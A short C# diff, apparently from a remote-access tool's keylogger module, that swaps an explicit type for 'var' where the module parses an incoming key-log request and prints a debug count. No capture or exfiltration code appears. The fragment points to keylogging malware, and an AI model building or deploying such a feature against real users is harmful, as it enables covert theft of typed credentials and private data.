@@ -13,7 +13,7 @@ internal class KeyLogger : FeatureBase
 	{
 		if (op != OpCodes.KeyLogRequest)
 			return;
-		OpStructs.KeyLogRequest req = StructConvert.Bytes2Struct<OpStructs.KeyLogRequest>(data);
+		var req = StructConvert.Bytes2Struct<OpStructs.KeyLogRequest>(data);
 #if DEBUG
 		Console.WriteLine("KeyLogger log receive. count=" + req.LogCount);
 #endif
